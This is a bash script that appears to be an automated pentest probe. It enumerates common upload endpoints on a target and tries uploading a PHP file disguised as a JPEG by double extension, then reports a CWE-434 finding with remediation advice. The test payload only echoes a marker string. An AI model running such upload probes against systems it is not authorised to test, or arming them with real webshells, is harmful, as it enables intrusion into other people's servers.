#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        File Upload Validation Test
# Description: Tests upload endpoints with dangerous file types
# Severity:    HIGH
# Category:    Framework & API Security (Laravel, WordPress, Spring, GraphQL)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: File Upload Validation Test\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
# find upload endpoint first
UPLOAD_EP=""
for EP in "upload" "api/upload" "api/v1/upload" "file/upload" "uploads" "api/file" "api/files" "media/upload"; do
  R=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$T/$EP" 2>/dev/null)
  if [ "$R" = "200" ] || [ "$R" = "405" ]; then
    UPLOAD_EP="$EP"
    break
  fi
done
if [ -n "$UPLOAD_EP" ]; then
  # try uploading a PHP webshell with double extension
  RESP=$(echo '<?php echo "upload-probe-ok"; ?>' | curl -s -X POST -F "file=@-;filename=test.php.jpg;type=image/jpeg" --max-time 15 "$T/$UPLOAD_EP" 2>/dev/null | head -c 1000)
  if echo "$RESP" | grep -qi "success\|uploaded\|ok\|url\|path"; then
    # check if the uploaded file is accessible and executes
    UPATH=$(echo "$RESP" | grep -oP '(https?://[^"]+|/[a-z0-9/_.-]+)\.(php|jpg)' | head -1)
    if [ -n "$UPATH" ]; then
      emit "{\"title\":\"File upload accepts PHP with double extension: /$UPLOAD_EP\",\"severity\":\"critical\",\"description\":\"Upload endpoint /$UPLOAD_EP accepted test.php.jpg. If stored executably, webshell deployment leads to RCE.\",\"remediation\":\"Validate file extension whitelist. Store uploads with random names outside web root. Disable PHP execution in upload dirs.\",\"cweId\":\"CWE-434\",\"owaspCategory\":\"A04:2025-Insecure Design\"}"
    fi
  fi
fi

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
